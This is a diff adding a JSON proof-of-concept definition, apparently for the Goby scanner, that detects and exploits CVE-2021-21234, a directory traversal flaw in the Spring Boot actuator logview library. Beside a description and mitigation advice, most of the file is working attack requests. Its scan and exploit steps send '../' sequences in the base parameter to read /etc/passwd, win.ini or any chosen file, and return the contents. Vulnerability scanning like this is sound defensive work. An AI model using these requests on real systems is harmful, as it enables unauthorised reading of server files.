@@ -1,0 +1,207 @@
+{
+      "Name": "Spring Boot Actuator Logview Path Traversal CVE-2021-21234",
+      "Level": "2",
+      "Tags": [
+            "pathtraversal"
+      ],
+      "GobyQuery": "product=\"SpringBoot\" || company=\"spring.io\"",
+      "Description": "Spring Boot makes it easy to create stand-alone, production-grade Spring based Applications that you can \"just run\".",
+      "Product": "Spring Boot",
+      "Homepage": "https://spring.io/projects/spring-boot",
+      "Author": "",
+      "Impact": "spring-boot-actuator-logview in a library that adds a simple logfile viewer as spring boot actuator endpoint. It is maven package \"eu.hinsch:spring-boot-actuator-logview\". In spring-boot-actuator-logview before version 0.2.13 there is a directory traversal vulnerability. The nature of this library is to expose a log file directory via admin (spring boot actuator) HTTP endpoints. Both the filename to view and a base folder (relative to the logging folder root) can be specified via request parameters. While the filename parameter was checked to prevent directory traversal exploits (so that `filename=../somefile` would not work), the base folder parameter was not sufficiently checked, so that `filename=somefile&amp;base=../` could access a file outside the logging base directory). The vulnerability has been patched in release 0.2.13. Any users of 0.2.12 should be able to update without any issues as there are no other changes in that release. There is no workaround to fix the vulnerability other than updating or removing the dependency. However, removing read access of the user the application is run with to any directory not required for running the application can limit the impact. Additionally, access to the logview endpoint can be limited by deploying the application behind a reverse proxy.",
+      "Recommendation": "Spring Boot applications using a vulnerable version of spring-boot-actuator-logview (version 0.2.12 and before) should update to the patched version (0.2.13) immediately. This update should be a drop-in replacement, as, according to the maintainer of the library, no other changes were made in this version.<br>As a temporary mitigation, access to the /log endpoint can be restricted (for example by using a reverse proxy) until a patch can be deployed.<br>Web server access logs should be audited for queries to the vulnerable path (/log/view) that also contain ../ (or equivalent encoded versions of this string) in the base parameter.",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-21234",
+            "https://spring.io/projects/spring-boot"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Filepath",
+                  "Type": "select",
+                  "Value": "/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../,/log/view?filename=/windows/win.ini&base=../../../../../../../../../../,/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../,/log/view?filename=/etc/passwd&base=../../../../../../../../../../"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "fonts",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "extensions",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "fonts",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "extensions",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/log/view?filename=/etc/passwd&base=../../../../../../../../../../",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "{{{Filepath}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
